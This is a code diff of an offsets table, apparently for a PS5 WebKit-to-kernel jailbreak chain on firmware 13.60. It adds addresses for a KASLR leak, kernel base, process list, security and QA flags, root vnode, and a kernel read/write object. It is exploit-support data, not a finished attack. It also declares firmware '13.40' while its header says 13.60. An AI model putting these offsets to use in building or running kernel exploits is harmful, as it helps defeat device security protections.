@@ -1,11 +1,15 @@
+// 13.60 -- generated from libSceNKWebKit / libkernel_web /
+// libSceLibcInternal. file offset = rva + 0x4000
+
+// host-constructor candidates: webkitBase = nativeCtorAddr - hc
 const OFFSET_wk_host_constructor_candidates = [0x00056A58, 0x00056CA0, 0x00057CE8];
-const OFFSET_wk_vtable_first_element     = 0;
+const OFFSET_wk_vtable_first_element     = 0; // needs a console
 const OFFSET_wk_memset_import = 0x03350850;
 const OFFSET_wk___stack_chk_guard_import = 0x0334E198;
 
 const OFFSET_lk___stack_chk_guard              = 0x000751D0;
-const OFFSET_lk__thread_list                   = 0x0006C218;
-const OFFSET_lk_worker_wait_return             = 0x0001FD01;
+const OFFSET_lk__thread_list                   = 0x0006C218; // consensus scan, 4 sites (lea r15,[rip+rva] mov r15,[rax] test r15,r15)
+const OFFSET_lk_worker_wait_return             = 0x0001FD01; // 64/64 sig port 13.xx; parked worker's wait-loop saved PC
 const OFFSET_lk_pthread_create_name_np         = 0x00021890;
 const OFFSET_lk_pthread_join                   = 0x000229A0;
 const OFFSET_lk_pthread_exit                   = 0x00021C20;
@@ -381,17 +385,43 @@ let syscall_map = {
 	0x2DD: 0x0001B480,
 };
 
-const OFFSET_KERNEL_ALLPROC                    = 0x03579E80;
-const OFFSET_KERNEL_SECURITY_FLAGS             = 0x01A49064;
-const OFFSET_KERNEL_TARGETID = 0x01A49064 + 0x09;
-const OFFSET_KERNEL_QA_FLAGS = 0x01A49064 + 0x24;
-const OFFSET_KERNEL_UTOKEN_FLAGS = 0x01A49064 + 0x8C;
-const OFFSET_KERNEL_ROOTVNODE                  = 0x03DE7510;
+/* ===========================================================================
+ * kernel exploit offsets (KERNEL-BASE relative; KBASE = 0xffffffff80210000).
+ *
+ * rt_msg2 KASLR leak (route_output sa_len OOB):
+ *   leak fn = 0xffffffff80d679f0 (console-boot path); call at fn+0x14f -> ret fn+0x154;
+ *   leak low16 = 0x7B41; OOB bcopy site at fn+0x194. The full fn/oob/retLow16/
+ *   retStatic table lives in aio.js RTMSG2 (kbaseLo = retLo - retStatic).
+ *
+ * Kernel data source: ps5-payload-dev/sdk crt/kernel.c, switch case 0x13600000 (13.60):
+ *   every symbol = DATA_BASE + rel with TEXT_BASE = DATA_BASE - 0x0CC0000;
+ *   => DATA_BASE rel-to-KBASE = 0x00CC0000 (PT_LOAD seg-2 vaddr 0xffffffff80ed0000).
+ * =========================================================================== */
+
+const KBASE                   = 0xffffffff80210000;  // KERNEL text base
+
+const OFFSET_kaslr_leak_static        = 0x00AD8AA0;  // leak fn + 0x151 (low16 0x7B41)
+const OFFSET_kaslr_leak_ret           = 0x00AD8AA0;   // ret of the call @ +0x14f
+
+// aio_multi_delete race offsets were ABANDONED -- the no-race chain uses the
+// rt_msg2 leak + pktopts/evf reclaim, so that block is intentionally absent.
+
+const OFFSET_KERNEL_ALLPROC                    = 0x03579E80;  // DATA_BASE + 0x28C9E80
+const OFFSET_KERNEL_SECURITY_FLAGS             = 0x01A49064;  // DATA_BASE + 0x0D9C064
+const OFFSET_KERNEL_TARGETID = 0x01A49064 + 0x09;  // SECF + 0x09
+const OFFSET_KERNEL_QA_FLAGS = 0x01A49064 + 0x24;  // SECF + 0x24
+const OFFSET_KERNEL_UTOKEN_FLAGS = 0x01A49064 + 0x8C;  // SECF + 0x8C
+const OFFSET_KERNEL_ROOTVNODE                  = 0x03DE7510;  // DATA_BASE + 0x314B510
 const OFFSET_KERNEL_VMSPACE_P_ROOT             = 0x1d0;
 const OFFSET_KERNEL_VMSPACE_VM_PMAP            = 0x2e8;
-const OFFSET_KERNEL_DATA                       = 0x00CB0000;
-const OFFSET_KERNEL_EVF_STR                    = 0x136D67D;
+const OFFSET_KERNEL_DATA                       = 0x00CB0000;  // DATA_BASE rel (seg-2 base)
+const OFFSET_KERNEL_EVF_STR                    = 0x136D67D;  // "evf cv" string, text-relative (aio leak anchor)
 
+/* ===== relapse window.KRW + SYMBOLS -- 13.60 port (k1360_work .i64) =====
+ * oid layout: number+0x10, kind+0x14, arg1+0x18, arg2+0x20 (same as 12.00).
+ * visibility gate at oid+0x50 (cpus=1/maxcpus=0, diff-confirmed). KBASE 0x80210000.
+ * SYMBOLS typeof-guarded: missing libc/libkernel export RVAs (NID resolve pending)
+ * default to 0 -- they are only used by the kexp handoff, NOT the kernel R/W. */
 window.KRW = {
     firmware: "13.40",
     kernelData: OFFSET_KERNEL_DATA,
